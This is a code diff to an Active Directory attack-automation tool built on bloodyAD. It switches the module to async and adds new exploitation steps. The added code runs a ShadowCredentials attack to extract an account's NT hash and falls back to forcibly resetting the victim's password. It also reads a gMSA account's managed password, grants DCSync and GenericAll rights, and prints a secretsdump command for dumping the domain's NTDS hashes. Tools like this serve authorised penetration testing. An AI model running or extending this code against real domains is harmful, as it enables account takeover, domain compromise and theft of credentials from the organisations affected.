@@ -1,9 +1,8 @@
 import bloodyAD
-from bloodyAD import utils
+from bloodyAD import utils, ConnectionHandler
 from bloodyAD.cli_modules import add, set, remove, get
-
-LOG = utils.LOG
-
+from bloodyAD.exceptions import LOG
+import asyncio
 
 class Automation:
     def __init__(self, args, path):
@@ -25,10 +24,11 @@ class Automation:
             100102: self._ownerObj,
             250: self._genericAll,
             350: self._ownerSpecialObj,
+            400000: self._readGMSAPassword,
         }
         self.dirty_laundry = []
 
-    def simulate(self):
+    async def simulate(self):
         self.simulation = True
         self.rel_str = {
             "setDCSync": "[Add DCSync right] to {}",
@@ -36,31 +36,33 @@ class Automation:
             "genericAll": "[GenericAll given] on {} to {}",
             "owner": "[Ownership Given] on {} to {}",
             "password": "[Change password] of {} to {}",
+            "shadowCredentials": "[Add Shadow Credentials] to {}",
+            "readGMSAPassword": "[Read GMSA Password] from {}",
         }
         print(f"\nAuthenticated as {self.co_args.username}:\n")
-        self._unfold()
+        await self._unfold()
 
-    def exploit(self):
+    async def exploit(self):
         self.simulation = False
-        self.conn = bloodyAD.ConnectionHandler(self.co_args)
-        self._unfold()
-        self.conn.rebind()
+        self.conn = ConnectionHandler(self.co_args)
+        await self._unfold()
+        await self.conn.rebind()
 
-    def _unfold(self):
+    async def _unfold(self):
         for rel in self.path:
             if not self.simulation:
                 LOG.info("")
             typeID = rel["cost"]
             try:
-                self.rel_types[typeID](rel)
+                await self.rel_types[typeID](rel)
             except Exception as e:
-                self._washer()
+                await self._washer()
                 # Quick fix for issue #5 remove it when dropping Neo4j dependency
                 if typeID == 9999999999:
                     raise ValueError("The path you're trying to exploit is not exploitable by autobloody only, you may need other tools to exploit it. See #Limitations in the README")
                 raise e
 
-    def _washer(self):
+    async def _washer(self):
         if self.simulation:
             print()
         self.dirty_laundry.reverse()
@@ -68,40 +70,40 @@ class Automation:
             if self.simulation:
                 self._printOperation(laundry["f"].__name__, laundry["args"], True)
             else:
-                laundry["f"](self.conn, *laundry["args"])
+                await laundry["f"](self.conn, *laundry["args"])
         self.dirty_laundry = []
 
-    def _switchUser(self, user, pwd):
-        self._washer()
+    async def _switchUser(self, user, pwd):
+        await self._washer()
         if self.simulation:
             print(f"\nAuthenticated as {user}:\n")
         else:
-            self.conn.switchUser(user, pwd)
+            await self.conn.switchUser(user, pwd)
 
-    def _nextHop(self, rel):
+    async def _nextHop(self, rel):
         return
 
-    def _dcSync(self, rel):
+    async def _dcSync(self, rel):
         if not self.simulation:
             print(
                 "[+] You can now dump the NTDS using: secretsdump.py"
                 f" '{self.conn.conf.domain}/{self.conn.conf.username}:{self.conn.conf.password}@{self.conn.conf.host}'"
             )
 
-    def _setDCSync(self, rel):
+    async def _setDCSync(self, rel):
         operation = add.setDCSync
         if self.simulation:
             user = rel["start_node"]["name"]
             self._printOperation(operation.__name__, [user])
         else:
             user = rel["start_node"]["distinguishedname"]
-            operation(self.conn, user)
+            await operation(self.conn, user)
 
-    def _ownerDomain(self, rel):
-        self._setOwner(rel)
-        self._setDCSync(rel)
+    async def _ownerDomain(self, rel):
+        await self._setOwner(rel)
+        await self._setDCSync(rel)
 
-    def _addMember(self, rel):
+    async def _addMember(self, rel):
         add_operation = add.groupMember
         if self.simulation:
             member = rel["start_node"]["name"]
@@ -110,48 +112,81 @@ class Automation:
         else:
             member = rel["start_node"]["objectid"]
             group = rel["end_node"]["distinguishedname"]
-            add_operation(self.conn, group, member)
-            self.conn.rebind()
+            await add_operation(self.conn, group, member)
+            await self.conn.rebind()
         self.dirty_laundry.append({"f": remove.groupMember, "args": [group, member]})
 
-    def _aclGroup(self, rel):
-        self._genericAll(rel)
-        self._addMember(rel)
+    async def _aclGroup(self, rel):
+        await self._genericAll(rel)
+        await self._addMember(rel)
 
-    def _ownerGroup(self, rel):
-        self._setOwner(rel)
-        self._aclGroup(rel)
+    async def _ownerGroup(self, rel):
+        await self._setOwner(rel)
+        await self._aclGroup(rel)
 
-    def _aclObj(self, rel):
-        self._genericAll(rel)
-        self._forceChangePassword(rel)
+    async def _aclObj(self, rel):
+        await self._genericAll(rel)
+        await self._forceChangePassword(rel)
 
-    def _ownerObj(self, rel):
-        self._setOwner(rel)
-        self._aclObj(rel)
+    async def _ownerObj(self, rel):
+        await self._setOwner(rel)
+        await self._aclObj(rel)
 
-    def _ownerSpecialObj(self, rel):
-        self._setOwner(rel)
-        self._genericAll(rel)
+    async def _ownerSpecialObj(self, rel):
+        await self._setOwner(rel)
+        await self._genericAll(rel)
 
-    # TODO: change password change with shadow credentials when it's possible
-    # TODO: don't perform change password if it's explicitly refused by user
-    def _forceChangePassword(self, rel):
-        pwd = "Password123!"
-        operation = set.password
+    # Use shadow credentials when possible, fallback to password change
+    async def _forceChangePassword(self, rel):
         if self.simulation:
             user = rel["end_node"]["name"]
-            self._printOperation(operation.__name__, [user, pwd])
+            self._printOperation("shadowCredentials", [user])
         else:
-            user = rel["end_node"]["distinguishedname"]
-            operation(self.conn, user, pwd)
-            user = next(get.search(self.conn, user, attr="sAMAccountName"))[
-                "sAMAccountName"
-            ]
-            LOG.debug(f"[+] switching to LDAP connection for user {user}")
-        self._switchUser(user, pwd)
+            user_dn = rel["end_node"]["distinguishedname"]
+            
+            # Try ShadowCredentials first
+            try:
+                LOG.info(f"[*] Attempting ShadowCredentials attack on {user_dn}")
+                nt_hashes = await add.shadowCredentials(self.conn, user_dn)
+                
+                # Extract username and NT hash from the result
+                ldap = await self.conn.getLdap()
+                user_entry = None
+                async for entry in ldap.bloodysearch(user_dn, attr=["sAMAccountName"]):
+                    user_entry = entry
+                    break
+                user = user_entry["sAMAccountName"]
+                
+                # Get the NT hash from the returned credentials
+                nt_hash = None
+                for cred in nt_hashes:
+                    if 'NT' in cred:
+                        nt_hash = cred['NT']
+                        break
+                
+                if nt_hash:
+                    LOG.info(f"[+] ShadowCredentials successful, got NT hash: {nt_hash}")
+                    pwd = f"aad3b435b51404eeaad3b435b51404ee:{nt_hash}"
+                else:
+                    LOG.warning("[!] ShadowCredentials succeeded but no NT hash retrieved, falling back to password change")
+                    raise Exception("No NT hash retrieved from ShadowCredentials")
+                    
+            except Exception as e:
+                LOG.warning(f"[!] ShadowCredentials failed: {str(e)}, falling back to password change")
+                # Fallback to password change
+                pwd = "Password123!"
+                await set.password(self.conn, user_dn, pwd)
+                user_entry = None
+                ldap = await self.conn.getLdap()
+                async for entry in ldap.bloodysearch(user_dn, attr=["sAMAccountName"]):
+                    user_entry = entry
+                    break
+                user = user_entry["sAMAccountName"]
+                LOG.debug(f"[+] Password changed, switching to LDAP connection for user {user}")
+        
+        await self._switchUser(user, pwd)
 
-    def _genericAll(self, rel):
+    async def _genericAll(self, rel):
         add_operation = add.genericAll
         if self.simulation:
             user = rel["start_node"]["name"]
@@ -160,10 +195,10 @@ class Automation:
         else:
             user = rel["start_node"]["distinguishedname"]
             target = rel["end_node"]["distinguishedname"]
-            add_operation(self.conn, target, user)
+            await add_operation(self.conn, target, user)
         self.dirty_laundry.append({"f": remove.genericAll, "args": [target, user]})
 
-    def _setOwner(self, rel):
+    async def _setOwner(self, rel):
         operation = set.owner
         if self.simulation:
             user = rel["start_node"]["name"]
@@ -172,7 +207,33 @@ class Automation:
         else:
             user = rel["start_node"]["distinguishedname"]
             target = rel["end_node"]["distinguishedname"]
-            operation(self.conn, target, user)
+            await operation(self.conn, target, user)
+
+    async def _readGMSAPassword(self, rel):
+        """Exploit ReadGMSAPassword edge to retrieve GMSA password"""
+        if self.simulation:
+            target = rel["end_node"]["name"]
+            self._printOperation("readGMSAPassword", [target])
+        else:
+            target_dn = rel["end_node"]["distinguishedname"]
+            
+            # Read msDS-ManagedPassword attribute from the GMSA account
+            ldap = await self.conn.getLdap()
+            password_blob = None
+            async for entry in get.object(self.conn, target_dn, attr="msDS-ManagedPassword"):
+                if "msDS-ManagedPassword" in entry:
+                    password_blob = entry["msDS-ManagedPassword"]
+                    break
+            
+            if password_blob:
+                LOG.info(f"[+] Retrieved GMSA password (base64): {password_blob}")
+                # The password is in base64 format from the get.object function
+                # In a real scenario, you would decode and parse this to get the NT hash
+                # For now, we just log it
+                print(f"[+] GMSA Password retrieved (base64): {password_blob}")
+            else:
+                LOG.error("[-] Failed to retrieve GMSA password")
+
 
     def _printOperation(self, operation_name, operation_args, revert=False):
         operation_str = "\t"
